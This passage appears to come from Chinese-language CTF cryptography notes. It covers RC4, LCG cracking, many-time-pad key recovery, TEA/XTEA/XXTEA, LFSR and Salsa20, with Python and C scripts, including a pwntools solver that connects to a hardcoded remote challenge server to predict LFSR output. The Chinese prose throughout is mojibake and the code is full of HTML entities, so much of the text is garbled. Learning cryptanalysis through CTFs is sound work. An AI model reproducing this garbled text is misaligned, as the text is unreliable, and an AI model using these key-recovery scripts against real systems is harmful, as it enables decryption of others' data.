ï¼Œå¹¶ä¸è¾“å…¥å­—èŠ‚å¼‚æˆ–ï¼Œå¾—åˆ°kã€‚å¾ªç¯ä¸­è¿˜æ”¹å˜äº†Sç›’ï¼ˆ(c)ï¼‰ã€‚å¦‚æœè¾“å…¥çš„æ˜¯æ˜æ–‡ï¼Œè¾“å‡ºçš„å°±æ˜¯å¯†æ–‡ï¼›å¦‚æœè¾“å…¥çš„æ˜¯å¯†æ–‡ï¼Œè¾“å‡ºçš„å°±æ˜¯æ˜æ–‡ã€‚ 123456789i := 0j := 0while GeneratingOutput: i := (i + 1) mod 256 //a j := (j + S[i]) mod 256 //b swap values of S[i] and S[j] //c k := inputByte ^ S[(S[i] + S[j]) % 256] output Kendwhile æ­¤ç®—æ³•ä¿è¯æ¯256æ¬¡å¾ªç¯ä¸­Sç›’çš„æ¯ä¸ªå…ƒç´ è‡³å°‘è¢«äº¤æ¢è¿‡ä¸€æ¬¡ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243#python2def KSA(key): keylength = len(key) S = range(256) j = 0 for i in range(256): j = (j + S[i] + key[i % keylength]) % 256 S[i], S[j] = S[j], S[i] # swap return Sdef PRGA(S): i = 0 j = 0 while True: i = (i + 1) % 256 j = (j + S[i]) % 256 S[i], S[j] = S[j], S[i] # swap K = S[(S[i] + S[j]) % 256] yield Kdef RC4(key): S = KSA(key) return PRGA(S)if __name__ == &#x27;__main__&#x27;: key = &#x27;Key&#x27; plaintext = &#x27;Plaintext&#x27; def convert_key(s): return [ord(c) for c in s] key = convert_key(key) keystream = RC4(key) import sys for c in plaintext: sys.stdout.write(&quot;%02X&quot; % (ord(c) ^ keystream.next())) print 123456789101112131415161718192021222324252627#python3N = 256S = [0] * Nkey = &#x27;keykeykey&#x27;Key = [0] * Nt = []for i in range(N): S[i] = i Key[i] = ord(key[i % len(key)])j = 0for i in range(N): j = (j + S[i] + Key[i]) % N S[i], S[j] = S[j], S[i]i = 0j = 0for k in range(len(t)): i = (i + 1) % N j = (j + S[i]) % N S[i], S[j] = S[j], S[i] t[k] ^= S[(S[i] + S[j]) % N]print(t)print(&#x27;&#x27;.join(chr(k) for k in t)) â€‹ çº¿æ€§åŒä½™ç”Ÿæˆå™¨ / çº¿æ€§åŒä½™æ–¹æ³•ï¼ˆLCGï¼‰çº¿æ€§åŒä½™æ–¹æ³•ï¼ˆLCGï¼‰æ˜¯ä¸ªäº§ç”Ÿä¼ªéšæœºæ•°çš„æ–¹æ³•ã€‚ å®ƒæ˜¯æ ¹æ®é€’å½’å…¬å¼äº§ç”Ÿï¼š $ N_{k+1} = (A\\times N_{k}+B){\\pmod {M}} $å…¶ä¸­ $A,B,M$ æ˜¯äº§ç”Ÿå™¨è®¾å®šçš„å¸¸æ•°ã€‚ LCGçš„å‘¨æœŸæœ€å¤§ä¸º $M$ï¼Œä½†å¤§éƒ¨åˆ†æƒ…å†µéƒ½ä¼šå°‘äº $M$ã€‚è¦ä»¤LCGè¾¾åˆ°æœ€å¤§å‘¨æœŸï¼Œåº”ç¬¦åˆä»¥ä¸‹æ¡ä»¶ï¼š $B,M$ äº’è´¨ï¼› $M$ çš„æ‰€æœ‰è´¨å› æ•°éƒ½èƒ½æ•´é™¤ $A-1$ï¼› è‹¥ $M$ æ˜¯4çš„å€æ•°ï¼Œ$A-1$ ä¹Ÿæ˜¯ï¼› $A,B,N_{0}$ éƒ½æ¯” $M$ å°ï¼› $A,B$ æ˜¯æ­£æ•´æ•°ã€‚ å‚è€ƒï¼šæ”»å‡»çº¿æ€§åŒä½™ç”Ÿæˆå™¨(LCG) 123456789101112131415161718192021222324252627282930313233343536373839from functools import reducefrom math import gcdfrom Crypto.Util.number import *def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y)def modinv(a, m): g, x, y = egcd(a, m) if g != 1: raise Exception(&#x27;modular inverse does not exist&#x27;) else: return x % mdef crack_unknown_increment(states, modulus, multiplier): increment = (states[1] - states[0]*multiplier) % modulus return modulus, multiplier, incrementdef crack_unknown_multiplier(states, modulus): multiplier = (states[2] - states[1]) * modinv(states[1] - states[0], modulus) % modulus return crack_unknown_increment(states, modulus, multiplier)def crack_unknown_modulus(states): diffs = [s1 - s0 for s0, s1 in zip(states, states[1:])] zeroes = [t2*t0 - t1*t1 for t0, t1, t2 in zip(diffs, diffs[1:], diffs[2:])] modulus = abs(reduce(gcd, zeroes)) return crack_unknown_multiplier(states, modulus)# N[i+1] = (A*N[i]+B) % M# A,B,Nå‡æœªçŸ¥sequence = []modulus, multiplier, increment = crack_unknown_modulus(sequence)print(&#x27;A = &#x27;+str(multiplier))print(&#x27;B = &#x27;+str(increment))print(&#x27;N = &#x27;+str(modulus)) â€‹ å¤šæ¬¡ä¸€å¯†ï¼ˆMany Time Pad Attackï¼‰ç”¨åŒä¸€ä¸ªå¯†é’¥å»åŠ å¯†å¤šæ¡æ˜æ–‡ï¼Œå½“å¯†æ–‡æ¡æ•°è¾ƒå¤šæ—¶å°±å¾ˆå®¹æ˜“è¢«æ”»å‡»ï¼Œä¾‹å¦‚Many Time Padã€‚ è¿™ä¸ªæ”»å‡»çš„åŸç†æ˜¯ $c_1âŠ•c_2 = m_1âŠ•m_2$ï¼Œè€Œé€šè¿‡ $m_1âŠ•m_2$ å¯ä»¥åˆ†æå‡º $m_1âŠ•m_2$ï¼Œå› æ­¤ $m_1âŠ•m_2$ ä¸å†å®‰å…¨ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#è„šæœ¬1import Crypto.Util.strxor as xoimport libnum, codecs, numpy as npdef isChr(x): if ord(&#x27;a&#x27;) &lt;= x and x &lt;= ord(&#x27;z&#x27;): return True if ord(&#x27;A&#x27;) &lt;= x and x &lt;= ord(&#x27;Z&#x27;): return True return Falsedef infer(index, pos): if msg[index, pos] != 0: return msg[index, pos] = ord(&#x27; &#x27;) for x in range(len(c)): if x != index: msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ ord(&#x27; &#x27;)def know(index, pos, ch): msg[index, pos] = ord(ch) for x in range(len(c)): if x != index: msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ ord(ch)dat = []def getSpace(): for index, x in enumerate(c): res = [xo.strxor(x, y) for y in c if x!=y] f = lambda pos: len(list(filter(isChr, [s[pos] for s in res]))) cnt = [f(pos) for pos in range(len(x))] for pos in range(len(x)): dat.append((f(pos), index, pos))c = [codecs.decode(x.strip().encode(), &#x27;hex&#x27;) for x in open(&#x27;Problem.txt&#x27;, &#x27;r&#x27;).readlines()]msg = np.zeros([len(c), len(c[0])], dtype=int)getSpace()dat = sorted(dat)[::-1]for w, index, pos in dat: infer(index, pos)know(10, 21, &#x27;y&#x27;)know(8, 14, &#x27;n&#x27;)print(&#x27;\\n&#x27;.join([&#x27;&#x27;.join([chr(c) for c in x]) for x in msg]))key = xo.strxor(c[0], &#x27;&#x27;.join([chr(c) for c in msg[0]]).encode())print(key) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081#è„šæœ¬2#!/usr/bin/python## OTP - Recovering the private key from a set of messages that were encrypted w/ the same private key (Many time pad attack) - crypto100-many_time_secret @ alexctf 2017# Original code by jwomers: https://github.com/Jwomers/many-time-pad-attack/blob/master/attack.py)import stringimport collectionsimport sets, sys# 11 unknown ciphertexts (in hex format), all encrpyted with the same keyc1=&#x27;daaa4b4e8c996dc786889cd63bc4df4d1e7dc6f3f0b7a0b61ad48811f6f7c9bfabd7083c53ba54&#x27;c2=&#x27;c5a342468c8c7a88999a9dd623c0cc4b0f7c829acaf8f3ac13c78300b3b1c7a3ef8e193840bb&#x27;c3=&#x27;dda342458c897a8285df879e3285ce511e7c8d9afff9b7ff15de8a16b394c7bdab920e7946a05e9941d8308e&#x27;c4=&#x27;d9b05b4cd5ce7c8f938bd39e24d0df191d7694dfeaf8bfbb56e28900e1b8dff1bb985c2d5aa154&#x27;c5=&#x27;d9aa4b00c88b7fc79d99d38223c08d54146b88d3f0f0f38c03df8d52f0bfc1bda3d7133712a55e9948c32c8a&#x27;c6=&#x27;c4b60e46c9827cc79e9698936bd1c55c5b6e87c8f0febdb856fe8052e4bfc9a5efbe5c3f57ad4b9944de34&#x27;c7=&#x27;d9aa5700da817f94d29e81936bc4c1555b7b94d5f5f2bdff37df8252ffbecfb9bbd7152a12bc4fc00ad7229090&#x27;c8=&#x27;c4e24645cd9c28939a86d3982ac8c819086989d1fbf9f39e18d5c601fbb6dab4ef9e12795bbc549959d9229090&#x27;c9=&#x27;d9aa4b598c80698a97df879e2ec08d5b1e7f89c8fbb7beba56f0c619fdb2c4bdef8313795fa149dc0ad4228f&#x27;c10=&#x27;cce25d48d98a6c8280df909926c0de19143983c8befab6ff21d99f52e4b2daa5ef83143647e854d60ad5269c87&#x27;c11=&#x27;d9aa4b598c85668885df9d993f85e419107783cdbee3bbba1391b11afcf7c3bfaa805c2d5aad42995ede2cdd82977244&#x27;ciphers = [c1, c2, c3, c4, c5, c6, c7, c8, c9, c10, c11]# The target ciphertext we want to crack# XORs two stringdef strxor(a, b): # xor two strings (trims the longer input) return &quot;&quot;.join([chr(ord(x) ^ ord(y)) for (x, y) in zip(a, b)])def target_fix(target_cipher): print &#x27;-------begin-------&#x27; # To store the final key final_key = [None]*150 # To store the positions we know are broken known_key_positions = set() # For each ciphertext for current_index, ciphertext in enumerate(ciphers): counter = collections.Counter() # for each other ciphertext for index, ciphertext2 in enumerate(ciphers): if current_index != index: # don&#x27;t xor a ciphertext with itself for indexOfChar, char in enumerate(strxor(ciphertext.decode(&#x27;hex&#x27;), ciphertext2.decode(&#x27;hex&#x27;))): # Xor the two ciphertexts # If a character in the xored result is a alphanumeric character, it means there was probably a space character in one of the plaintexts (we don&#x27;t know which one) if char in string.printable and char.isalpha(): counter[indexOfChar] += 1 # Increment the counter at this index knownSpaceIndexes = [] # Loop through all positions where a space character was possible in the current_index cipher for ind, val in counter.items(): # If a space was found at least 7 times at this index out of the 9 possible XORS, then the space character was likely from the current_index cipher! if val &gt;= 7: knownSpaceIndexes.append(ind) #print knownSpaceIndexes # Shows all the positions where we now know the key! # Now Xor the current_index with spaces, and at the knownSpaceIndexes positions we get the key back! xor_with_spaces = strxor(ciphertext.decode(&#x27;hex&#x27;),&#x27; &#x27;*150) for index in knownSpaceIndexes: # Store the key&#x27;s value at the correct position final_key[index] = xor_with_spaces[index].encode(&#x27;hex&#x27;) # Record that we known the key at this position known_key_positions.add(index) # Construct a hex key from the currently known key, adding in &#x27;00&#x27; hex chars where we do not know (to make a complete hex string) final_key_hex = &#x27;&#x27;.join([val if val is not None else &#x27;00&#x27; for val in final_key]) # Xor the currently known key with the target cipher output = strxor(target_cipher.decode(&#x27;hex&#x27;),final_key_hex.decode(&#x27;hex&#x27;)) print &quot;Fix this sentence:&quot; print &#x27;&#x27;.join([char if index in known_key_positions else &#x27;*&#x27; for index, char in enumerate(output)])+&quot;\\n&quot; # WAIT.. MANUAL STEP HERE # This output are printing a * if that character is not known yet # fix the missing characters like this: &quot;Let*M**k*ow if *o&#123;*a&quot; = &quot;cure, Let Me know if you a&quot; # if is too hard, change the target_cipher to another one and try again # and we have our key to fix the entire text! #sys.exit(0) #comment and continue if u got a good key print &#x27;------end------&#x27; for i in ciphers: target_fix(i) äº¤äº’çŒœï¼š 1234567891011121314151617181920212223242526from functools import reducedef xor(*args): if len(args) == 2: x, y = args return bytes([a ^ b for a, b in zip(x, y)]) return reduce(xor, args)ct = [ b&quot;\\xc1=\\x01&#125;\\xe7\\x1c\\x94YRj\\xb3\\xa7K@\\xde\\x0c\\x9a\\xc9\\x00\\xb0ZB\\r\\x87\\r\\x8b\\x8f\\xffQ\\xc7&quot;, b&quot;\\xfc\\x1d4^\\xd0o\\xb2GE|\\x89\\xe4^]\\xcfE\\x86\\xdd\\x1e\\x8a\\r@\\x1c\\x96r\\x92\\x87\\xec\\x19\\xd4&quot;, b&quot;\\xfa\\x19!P\\x82;\\xa8G\\x10\\x7f\\x80\\xa5DP\\xdeE\\x94\\xc8S\\x9cHH\\x1f\\x8a!\\x87\\xc0\\xe3\\x1f\\xcd&quot;,]key = xor(b&quot;SECFEST&#123;&quot;, ct[0])while True: pts = [xor(key, c) for c in ct] for i, pt in enumerate(pts): print(i, pt) idx = int(input(&quot;Enter index: &quot;)) if idx == -1: break c = input(&quot;Enter next char: &quot;)[0] key += bytes([ord(c) ^ ct[idx][len(key)]]) print(&quot;Current key:&quot;, key.hex())print([xor(key, c) for c in ct]) â€‹ TEA / XTEA / XXTEA TEAå¾®å‹åŠ å¯†ç®—æ³•ï¼ˆTiny Encryption Algorithmï¼ŒTEAï¼‰æ˜¯ä¸€ç§æ˜“äºæè¿°å’Œæ‰§è¡Œçš„å—å¯†ç ï¼Œé€šå¸¸åªéœ€è¦å¾ˆå°‘çš„ä»£ç å°±å¯å®ç°ã€‚TEA æ“ä½œå¤„ç†åœ¨ä¸¤ä¸ª 32 ä½æ— ç¬¦å·æ•´å‹ä¸Šï¼ˆå¯èƒ½æºäºä¸€ä¸ª 64 ä½æ•°æ®ï¼‰ï¼Œå¹¶ä¸”ä½¿ç”¨ä¸€ä¸ª 128 ä½çš„å¯†é’¥ã€‚è®¾è®¡è€…æ˜¯ Roger Needham å’Œ David Wheelerã€‚ åŠ å¯†è¿‡ç¨‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445def encrypt(v, k): v0 = v[0] v1 = v[1] x = 0 delta = 0x9E3779B9 k0 = k[0] k1 = k[1] k2 = k[2] k3 = k[3] for i in range(32): x += delta x = x &amp; 0xFFFFFFFF v0 += ((v1 &lt;&lt; 4) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; 5) + k1) v0 = v0 &amp; 0xFFFFFFFF v1 += ((v0 &lt;&lt; 4) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; 5) + k3) v1 = v1 &amp; 0xFFFFFFFF v[0] = v0 v[1] = v1 return vdef decrypt(v, k): v0 = v[0] v1 = v[1] x = 0x9E3779B9 * 32 delta = 0x9E3779B9 k0 = k[0] k1 = k[1] k2 = k[2] k3 = k[3] for i in range(32): v1 -= ((v0 &lt;&lt; 4) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; 5) + k3) v1 = v1 &amp; 0xFFFFFFFF v0 -= ((v1 &lt;&lt; 4) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; 5) + k1) v0 = v0 &amp; 0xFFFFFFFF x -= delta x = x &amp; 0xFFFFFFFF v[0] = v0 v[1] = v1 return vif __name__ == &#x27;__main__&#x27;: plain = [1, 2] key = [2, 2, 3, 4] encrypted = encrypt(plain, key) print(encrypted) decrypted = decrypt(encrypted, key) print(decrypted) 12345678910111213141516171819202122232425262728293031323334353637383940414243//Cç‰ˆï¼Œå¸¦ç¬¦å·ä½ç§»(unsigned int -â†’ int)#include &lt;stdio.h&gt;#include &lt;stdint.h&gt; //åŠ å¯†å‡½æ•°void encrypt (int* v, int* k) &#123; int v0=v[0], v1=v[1], sum=0, i; /* set up */ int delta=0x9e3779b9; /* a key schedule constant */ int k0=k[0], k1=k[1], k2=k[2], k3=k[3]; /* cache key */ for (i=0; i &lt; 32; i++) &#123; /* basic cycle start */ sum += delta; v0 += ((v1&lt;&lt;4) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;5) + k1); v1 += ((v0&lt;&lt;4) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;5) + k3); &#125; /* end cycle */ v[0]=v0; v[1]=v1;&#125;//è§£å¯†å‡½æ•°void decrypt (int* v, int* k) &#123; int v0=v[0], v1=v[1], sum=0x9e3779b9*32, i; /* set up */ int delta=0x9e3779b9; /* a key schedule constant */ int k0=k[0], k1=k[1], k2=k[2], k3=k[3]; /* cache key */ for (i=0; i&lt;32; i++) &#123; /* basic cycle start */ v1 -= ((v0&lt;&lt;4) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;5) + k3); v0 -= ((v1&lt;&lt;4) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;5) + k1); sum -= delta; &#125; /* end cycle */ v[0]=v0; v[1]=v1;&#125; int main()&#123; int v[14656]=&#123;0&#125;,k[4]=&#123;0x67616C66, 0x6B61667B, 0x6C665F65, 0x7D216761&#125;; FILE *p1 = fopen(&quot;./tea.png.out&quot;, &quot;rb&quot;); fread(&amp;v, 4, 14656, p1); fclose(p1); for(int i=0;i&lt;14656;i+=2)&#123; decrypt(&amp;v[i], k); &#125; FILE *p2 = fopen(&quot;./tea.png&quot;, &quot;wb&quot;); fwrite(&amp;v, 4, 14656, p2); fclose(p2); return 0;&#125; XTEAXTEA æ˜¯ TEA çš„å‡çº§ç‰ˆï¼Œå¢åŠ äº†æ›´å¤šçš„å¯†é’¥è¡¨ï¼Œç§»ä½å’Œå¼‚æˆ–æ“ä½œç­‰ç­‰ã€‚ åŠ å¯†è¿‡ç¨‹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738def encrypt(rounds, v, k): v0 = v[0] v1 = v[1] x = 0 delta = 0x9E3779B9 for i in range(rounds): v0 += (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (x + k[x &amp; 3]) v0 = v0 &amp; 0xFFFFFFFF x += delta x = x &amp; 0xFFFFFFFF v1 += (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (x + k[(x &gt;&gt; 11) &amp; 3]) v1 = v1 &amp; 0xFFFFFFFF v[0] = v0 v[1] = v1 return vdef decrypt(rounds, v, k): v0 = v[0] v1 = v[1] delta = 0x9E3779B9 x = delta * rounds for i in range(rounds): v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (x + k[(x &gt;&gt; 11) &amp; 3]) v1 = v1 &amp; 0xFFFFFFFF x -= delta x = x &amp; 0xFFFFFFFF v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (x + k[x &amp; 3]) v0 = v0 &amp; 0xFFFFFFFF v[0] = v0 v[1] = v1 return vif __name__ == &#x27;__main__&#x27;: plain = [1, 2] key = [2, 2, 3, 4] rounds = 32 encrypted = encrypt(rounds, plain, key) print(encrypted) decrypted = decrypt(rounds, encrypted, key) print(decrypted) 123456789101112131415161718192021//Cç‰ˆï¼Œå¸¦ç¬¦å·#include&lt;stdio.h&gt;int map[2] = &#123;0xB5ABA743, 0x4C5B3EE0&#125;;void decode(int* v) &#123; int sum = 0; for(int i=0; i&lt;32; ++i) sum += 0x9E3779B9; int key[] = &#123;1, 2&#125;; for(int j=0; j&lt;32; ++j) &#123; v[1] -= (((v[0] &lt;&lt; 4) ^ (v[0] &gt;&gt; 5)) + v[0]) ^ (sum + key[sum &amp; 3]); v[0] -= (((v[1] &lt;&lt; 4) ^ (v[1] &gt;&gt; 5)) + v[1]) ^ (sum + key[sum &amp; 3]); sum -= 0x9E3779B9; &#125;&#125;int main() &#123; decode(map); for(int i=0; i&lt;2; ++i) printf(&quot;%d\\n&quot;, map[i]); return 0;&#125; XXTEAXXTEAï¼Œåˆç§° Corrected Block TEAï¼Œæ˜¯ XTEA çš„å‡çº§ç‰ˆã€‚ åŠ å¯†è¿‡ç¨‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445def shift(z, y, x, k, p, e): return ((((z &gt;&gt; 5) ^ (y &lt;&lt; 2)) + ((y &gt;&gt; 3) ^ (z &lt;&lt; 4))) ^ ((x ^ y) + (k[(p &amp; 3) ^ e] ^ z)))def encrypt(v, k): delta = 0x9E3779B9 n = len(v) rounds = 6 + 52 // n x = 0 z = v[n - 1] for i in range(rounds): x = (x + delta) &amp; 0xFFFFFFFF e = (x &gt;&gt; 2) &amp; 3 for p in range(n - 1): y = v[p + 1] v[p] = (v[p] + shift(z, y, x, k, p, e)) &amp; 0xFFFFFFFF z = v[p] p += 1 y = v[0] v[n - 1] = (v[n - 1] + shift(z, y, x, k, p, e)) &amp; 0xFFFFFFFF z = v[n - 1] return vdef decrypt(v, k): delta = 0x9E3779B9 n = len(v) rounds = 6 + 52 // n x = (rounds * delta) &amp; 0xFFFFFFFF y = v[0] for i in range(rounds): e = (x &gt;&gt; 2) &amp; 3 for p in range(n - 1, 0, -1): z = v[p - 1] v[p] = (v[p] - shift(z, y, x, k, p, e)) &amp; 0xFFFFFFFF y = v[p] p -= 1 z = v[n - 1] v[0] = (v[0] - shift(z, y, x, k, p, e)) &amp; 0xFFFFFFFF y = v[0] x = (x - delta) &amp; 0xFFFFFFFF return vif __name__ == &#x27;__main__&#x27;: plain = [1, 2] key = [2, 2, 3, 4] encrypted = encrypt(plain, key) print(encrypted) decrypted = decrypt(encrypted, key) print(decrypted) â€‹ LFSRçº¿æ€§åé¦ˆç§»ä½å¯„å­˜å™¨ï¼ˆLinear feedback shift registerï¼ŒLFSRï¼‰æ˜¯æŒ‡ç»™å®šå‰ä¸€çŠ¶æ€çš„è¾“å‡ºï¼Œå°†è¯¥è¾“å‡ºçš„çº¿æ€§å‡½æ•°å†ç”¨ä½œè¾“å…¥çš„ç§»ä½å¯„å­˜å™¨ã€‚çº¿æ€§åé¦ˆç§»ä½å¯„å­˜å™¨(LFSR)å½’å±äºç§»ä½å¯„å­˜å™¨(FSR)ï¼Œé™¤æ­¤ä¹‹å¤–è¿˜æœ‰éçº¿æ€§ç§»ä½å¯„å­˜å™¨ï¼ˆNFSRï¼‰ã€‚ $\\text{GF}(2)$ ä¸Šä¸€ä¸ª $n$ çº§åé¦ˆç§»ä½å¯„å­˜å™¨ç”± $n$ ä¸ªäºŒå…ƒå­˜å‚¨å™¨ä¸ä¸€ä¸ªåé¦ˆå‡½æ•° $f(a_1,a_2,\\cdots,a_n)$ ç»„æˆï¼š ç§»ä½å¯„å­˜å™¨ä¸‰è¦ç´ ï¼š åˆå§‹çŠ¶æ€ï¼šç”±ç”¨æˆ·ç¡®å®š åé¦ˆå‡½æ•°ï¼š$f(a_1,a_2,\\cdots,a_n)$ æ˜¯ $n$ å…ƒå¸ƒå°”å‡½æ•°ï¼Œå³å‡½æ•°çš„è‡ªå˜é‡å’Œå› å˜é‡åªå–0å’Œ1è¿™ä¸¤ä¸ªå¯èƒ½å€¼ è¾“å‡ºåºåˆ— å¦‚æœåé¦ˆå‡½æ•°æ˜¯çº¿æ€§çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç§°å…¶ä¸ºçº¿æ€§åé¦ˆç§»ä½å¯„å­˜å™¨(LFSR)ï¼š LFSRçš„è¾“å‡ºåºåˆ— $\\{a_n\\}$ æ»¡è¶³ï¼š $\\begin{cases} a_{n+1} = c_1a_{n} \\oplus c_2a_{n-1} \\oplus\\cdots\\oplus c_na_1 \\newline a_{n+2} = c_1a_{n+1} \\oplus c_2a_{n} \\oplus\\cdots\\oplus c_na_2 \\newline \\vdots \\newline a_{n+i} = c_1a_{n+i-1} \\oplus c_2a_{n+i-2} \\oplus\\cdots\\oplus c_na_i \\end{cases}$ å¯¹äº $n$ çº§çº¿æ€§åé¦ˆç§»ä½å¯„å­˜å™¨ï¼Œæœ€é•¿å‘¨æœŸä¸º $2^n-1$ï¼ˆæ’é™¤å…¨0ï¼‰ï¼Œè¾¾åˆ°æœ€é•¿å‘¨æœŸçš„åºåˆ—ä¸€èˆ¬ç§°ä¸º $m$ åºåˆ—ã€‚ B-M ç®—æ³• ï¼ˆå¾…è¡¥å……ï¼‰ å‚è€ƒ æ·±å…¥åˆ†æCTFä¸­çš„LFSRç±»é¢˜ç›®ï¼ˆä¸€ï¼‰ æ·±å…¥åˆ†æCTFä¸­çš„LFSRç±»é¢˜ç›®ï¼ˆäºŒï¼‰ CTFç«èµ›å¯†ç å­¦ ä¹‹ LFSR 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879#Example#coding=utf-8from pwn import *r=remote(&#x27;182.92.108.71&#x27;,30607)c=[]for i in range(10): r.recvline() r.sendlineafter(&#x27;guess: &#x27;,&#x27;0&#x27;) x=r.recvline() if &#x27;Right&#x27; in x: c+=[0] else: xx=int(x.strip().split(&#x27;is &#x27;)[1]) c+=[xx]print(c)class lfsr(): def __init__(self, init, mask, length): self.init = init self.mask = mask self.lengthmask = 2**(length+1)-1 def next(self): nextdata = (self.init &lt;&lt; 1) &amp; self.lengthmask i = self.init &amp; self.mask &amp; self.lengthmask output = 0 while i != 0: output ^= (i &amp; 1) i = i &gt;&gt; 1 nextdata ^= output self.init = nextdata return output def random(self, nbit): output = 0 for _ in range(nbit): output &lt;&lt;= 1 output |= self.next() return output mask = 0b1011001010001010000100001000111011110101N = 40key = &#x27;&#x27;for i in range(N // 4): t = c[i] for j in range(3, -1, -1): key += str(t &gt;&gt; j &amp; 1)idx = 0ans = &quot;&quot;key = key[39] + key[:40]print(key)while idx &lt; 40: tmp = 0 for i in range(40): if mask &gt;&gt; i &amp; 1: tmp ^= int(key[39 - i]) ans = str(tmp) + ans idx += 1 key = key[39] + str(tmp) + key[1:39]init = int(ans, 2)print(init)prng = lfsr(init, 0b1011001010001010000100001000111011110101, 40)for i in range(10): print(prng.random(4))for i in range(90): r.recvline() r.sendlineafter(&#x27;guess: &#x27;,str(prng.random(4))) print(r.recvline())print(r.recvall()) â€‹ Salsa20Salsa20æ˜¯ä¸€ç§æµå¼å¯¹ç§°åŠ å¯†ç®—æ³•ï¼Œç±»ä¼¼äºChacha20ï¼Œç®—æ³•æ€§èƒ½ç›¸æ¯”AESèƒ½å¤Ÿå¿«3å€ä»¥ä¸Šã€‚ Salsa20ç®—æ³•é€šè¿‡å°†32 Byteçš„keyå’Œ8 Byteçš„éšæœºæ•°nonceæ‰©å±•ä¸º $2^{70}$ Byteçš„éšæœºå­—èŠ‚æµï¼Œé€šè¿‡éšæœºå­—èŠ‚æµå’Œå¼‚æˆ–æ“ä½œå®ç°åŠ è§£å¯†ï¼Œå› æ­¤Salsa20ç®—æ³•ä¸­éšæœºå­—èŠ‚æµçš„ç”Ÿæˆä¸ºå…³é”®æ‰€åœ¨ã€‚ Salsa20ç®—æ³•ç”Ÿæˆéšæœºå­—èŠ‚æµæ—¶ï¼Œä¸€æ¬¡ç”Ÿæˆä¸€ä¸ª64å­—èŠ‚çš„blockï¼Œæ¯ä¸€ä¸ªblockæ˜¯é€šè¿‡å°†keyã€nonceå’Œblock numberä»¥åŠéƒ¨åˆ†å¸¸é‡ç»„æˆ64å­—èŠ‚çš„inputï¼Œé€šè¿‡æ ¸å‡½æ•°ï¼Œè¾“å‡º64å­—èŠ‚çš„outputã€‚æœ€ç»ˆå¤šä¸ªblockç»„æˆé•¿åº¦ä¸º $2^{70}$ çš„éšæœºå­—èŠ‚æµï¼Œåœ¨ç”Ÿæˆè¿‡ç¨‹ä¸­ï¼Œæ¯ä¸ªblockç›¸äº’ç‹¬ç«‹ã€‚ è¾“å…¥ 64å­—èŠ‚çš„inputåˆ†ä¸º16ä¸ªwordï¼Œæ¯ä¸ªwordä¸º4å­—èŠ‚ï¼Œç”±ä»¥ä¸‹8éƒ¨åˆ†ç»„æˆï¼š 4å­—èŠ‚çš„å¸¸é‡0x61707865keyçš„å‰16å­—èŠ‚4å­—èŠ‚çš„å¸¸é‡0x3320646e8å­—èŠ‚çš„éšæœºæ•°nonce8å­—èŠ‚çš„block-counter4å­—èŠ‚çš„å¸¸é‡0x79622d32keyçš„å‰©ä½™16å­—èŠ‚4å­—èŠ‚çš„å¸¸é‡0x6b206574 æœ€ç»ˆ64å­—èŠ‚ï¼ˆ16 wordsï¼‰ç»„æˆä¸€ä¸ª4*4çš„çŸ©é˜µã€‚ä¾‹å¦‚ï¼Œå¯¹äºkey (1, 2, 3, 4, 5, . . . , 32)ï¼Œnonce(3, 1, 4, 1, 5, 9, 2, 6)ï¼Œä»¥åŠ block 7çš„åˆå§‹çŸ©é˜µä¸ºï¼š 12340x61707865, 0x04030201, 0x08070605, 0x0c0b0a090x100f0e0d, 0x3320646e, 0x01040103, 0x060209050x00000007, 0x00000000, 0x79622d32, 0x141312110x18171615, 0x1c1b1a19, 0x201f1e1d, 0x6b206574 æ ¸å‡½æ•° Salsa20ç®—æ³•æ ¸å‡½æ•°å°†64å­—èŠ‚çš„è¾“å…¥ä»¥çŸ©é˜µå½¢å¼ä½œä¸ºå‚æ•°ï¼Œè¾“å‡º64å­—èŠ‚çš„è¿ç®—ç»“æœã€‚ Salsa20æ ¸å‡½æ•°è¿ç®—ä¸»è¦åŒ…æ‹¬çš„è¿ç®—å¦‚ä¸‹ï¼Œå…¶ä¸­aå’Œbçš†ä¸º32bitï¼ˆ4 Byteï¼‰çš„æ•°æ®ï¼š 32 bitæ¨¡åŠ ï¼š(a + b) mod 2^32 å¼‚æˆ–ï¼ša XOR b å·¦ç§»ï¼ša &lt;&lt;&lt; bï¼Œå…¶ä¸­bä¸ºå¸¸é‡ï¼Œåœ¨Salsa20ç®—æ³•ä¸­å·¦ç§»çš„å€¼ä¸º7ã€9ã€13ã€18 é’ˆå¯¹è¾“å…¥çŸ©é˜µä¸­çš„æ¯ä¸ªwordï¼Œæ‰§è¡Œ20è½®çš„å¦‚ä¸‹æ“ä½œï¼š b âŠ•= (a âŠ c) &lt;&lt;&lt; kï¼Œå…¶ä¸­âŠ•ä¸ºå¼‚æˆ–ï¼ŒâŠæ¨¡åŠ ï¼Œ&lt;&lt;&lt;ä¸ºå·¦ç§»ã€‚ ç»è¿‡20è½®è®¡ç®—åï¼Œå°†è¾“å‡ºçš„çŸ©é˜µæ ¸åŸå§‹çŸ©é˜µç›¸åŠ ï¼Œå¾—åˆ°è¾“å‡ºã€‚ Salsa20æ 